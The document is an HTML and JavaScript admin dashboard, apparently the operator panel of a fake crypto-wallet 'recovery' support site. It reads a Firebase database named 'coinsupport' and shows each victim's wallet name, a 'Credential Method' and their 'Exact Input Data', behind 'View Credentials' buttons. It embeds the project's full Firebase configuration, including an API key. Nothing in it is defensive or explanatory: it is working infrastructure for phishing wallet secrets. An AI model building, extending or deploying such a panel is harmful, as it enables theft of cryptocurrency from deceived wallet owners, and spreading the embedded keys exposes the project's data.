<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Dashboard - Secured Recovery Protocol</title>
<style>
body {
    margin: 0;
    background-color: #050505;
    color: white;
    font-family: system-ui, -apple-system, sans-serif;
    padding: 20px;
}
h1 { 
    font-size: 24px; 
    text-align: center; 
    margin-bottom: 20px; 
    font-weight: 800;
    letter-spacing: 1px;
}
.container {
    max-width: 1200px;
    margin: 0 auto;
}
.table-container {
    overflow-x: auto;
    background: #111;
    border-radius: 12px;
    border: 1px solid #333;
    padding: 20px;
}
table {
    width: 100%;
    border-collapse: collapse;
    min-width: 800px;
}
th {
    text-align: left;
    padding: 15px;
    border-bottom: 2px solid #333;
    color: #aaa;
    font-size: 14px;
    text-transform: uppercase;
}
td {
    padding: 15px;
    border-bottom: 1px solid #222;
    vertical-align: top;
}
tr:hover {
    background: #1a1a1a;
}
.wallet-name {
    color: #3b82f6;
    font-weight: bold;
}
.issue-type {
    color: #fff;
    font-weight: 600;
}
.status-pending {
    color: #fbbf24;
    font-weight: bold;
}
.status-resolved {
    color: #22c55e;
    font-weight: bold;
}
.btn-view {
    background: #3b82f6;
    color: white;
    border: none;
    padding: 8px 16px;
    border-radius: 6px;
    cursor: pointer;
    font-weight: 600;
    transition: 0.2s;
}
.btn-view:hover {
    background: #2563eb;
}
.btn-resolve {
    background: #22c55e;
    color: white;
    border: none;
    padding: 8px 16px;
    border-radius: 6px;
    cursor: pointer;
    font-weight: 600;
    transition: 0.2s;
}
.btn-resolve:hover {
    background: #16a34a;
}

/* Modal Styles */
.modal-overlay {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.9);
    z-index: 2000;
    justify-content: center;
    align-items: center;
}
.modal-overlay.active {
    display: flex;
}
.modal-content {
    background: #111;
    border: 1px solid #333;
    border-radius: 16px;
    width: 90%;
    max-width: 600px;
    padding: 30px;
    position: relative;
    box-shadow: 0 10px 25px rgba(0,0,0,0.5);
}
.close-btn {
    position: absolute;
    top: 15px;
    right: 15px;
    background: none;
    border: none;
    color: #666;
    font-size: 24px;
    cursor: pointer;
}
.close-btn:hover { color: #fff; }

.credential-box {
    background: #000;
    border: 1px solid #333;
    border-radius: 8px;
    padding: 15px;
    margin-top: 15px;
    font-family: monospace;
    word-break: break-all;
    color: #22c55e;
    max-height: 200px;
    overflow-y: auto;
}
.label {
    color: #aaa;
    font-size: 14px;
    margin-bottom: 5px;
    display: block;
}
.value {
    color: #fff;
    font-size: 16px;
    font-weight: bold;
}
</style>
</head>
<body>

<h1>ADMIN DASHBOARD - SECURED RECOVERY PROTOCOL</h1>

<div class="container">
    <div class="table-container">
        <table id="issues-table">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Wallet</th>
                    <th>Issue</th>
                    <th>Status</th>
                    <th>Time</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody id="table-body">
                <!-- Rows will be inserted here by JS -->
            </tbody>
        </table>
    </div>
</div>

<!-- View Credentials Modal -->
<div id="credentialModal" class="modal-overlay">
    <div class="modal-content">
        <button class="close-btn" onclick="closeCredentialModal()">&times;</button>
        <h2 style="margin-top:0;">User Credentials</h2>
        
        <div style="margin-bottom: 20px;">
            <span class="label">Wallet Name:</span>
            <div class="value" id="modal-wallet"></div>
        </div>

        <div style="margin-bottom: 20px;">
            <span class="label">Issue Selected:</span>
            <div class="value" id="modal-issue"></div>
        </div>

        <div style="margin-bottom: 20px;">
            <span class="label">Credential Method:</span>
            <div class="value" id="modal-method"></div>
        </div>

        <div>
            <span class="label">Exact Input Data:</span>
            <div class="credential-box" id="modal-data"></div>
        </div>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getDatabase, ref, onValue, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

    // YOUR EXACT FIREBASE CONFIGURATION
    const firebaseConfig = {
      apiKey: "AIzaSyC33I7HRwiKo7DtdRsdtdK6OnqDwAquJfI",
      authDomain: "coinsupport-8b036.firebaseapp.com",
      databaseURL: "https://coinsupport-8b036-default-rtdb.europe-west1.firebasedatabase.app",
      projectId: "coinsupport-8b036",
      storageBucket: "coinsupport-8b036.firebasestorage.app",
      messagingSenderId: "575774102570",
      appId: "1:575774102570:web:1d0c34b60807dfb2c75f53",
      measurementId: "G-YGCSNX4H9L"
    };

    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    // Listen for changes in the 'issues' node
    const issuesRef = ref(db, 'issues');
    
    onValue(issuesRef, (snapshot) => {
        const tableBody = document.getElementById('table-body');
        tableBody.innerHTML = ''; // Clear existing rows

        const data = snapshot.val();
        if (!data) return;

        // Convert object to array and sort by timestamp (newest first)
        const issuesArray = Object.keys(data).map(key => ({
            id: key,
            ...data[key]
        })).sort((a, b) => b.timestamp - a.timestamp);

        issuesArray.forEach(issue => {
            const row = document.createElement('tr');
            
            // Format date
            const date = new Date(issue.timestamp).toLocaleString();
            
            // Status badge
            const statusClass = issue.status === 'Resolved' ? 'status-resolved' : 'status-pending';
            const statusText = issue.status || 'Pending Review';

            row.innerHTML = `
                <td style="color:#666; font-size:12px;">${issue.id.substring(0,8)}...</td>
                <td class="wallet-name">${issue.walletName || 'Unknown'}</td>
                <td class="issue-type">${issue.issueType || 'N/A'}</td>
                <td class="${statusClass}">${statusText}</td>
                <td style="color:#666; font-size:13px;">${date}</td>
                <td>
                    <button class="btn-view" onclick='viewCredentials(${JSON.stringify(issue).replace(/'/g, "&#39;")})'>View Credentials</button>
                    ${issue.status !== 'Resolved' ? `<button class="btn-resolve" onclick="resolveIssue('${issue.id}')">Resolve</button>` : ''}
                </td>
            `;
            tableBody.appendChild(row);
        });
    });

    // Function to open the credential modal
    window.viewCredentials = function(issue) {
        document.getElementById('modal-wallet').textContent = issue.walletName || 'Unknown';
        document.getElementById('modal-issue').textContent = issue.issueType || 'N/A';
        document.getElementById('modal-method').textContent = issue.credentialMethod || 'N/A';
        
        // Display the exact input data
        const dataBox = document.getElementById('modal-data');
        dataBox.textContent = issue.credentialData || 'No data provided';
        
        document.getElementById('credentialModal').classList.add('active');
    }

    window.closeCredentialModal = function() {
        document.getElementById('credentialModal').classList.remove('active');
    }

    window.resolveIssue = function(id) {
        if(confirm("Mark this issue as resolved?")) {
            update(ref(db, 'issues/' + id), {
                status: 'Resolved',
                adminNote: 'Resolved via Admin Panel'
            });
        }
    }
</script>
</body>
</html>
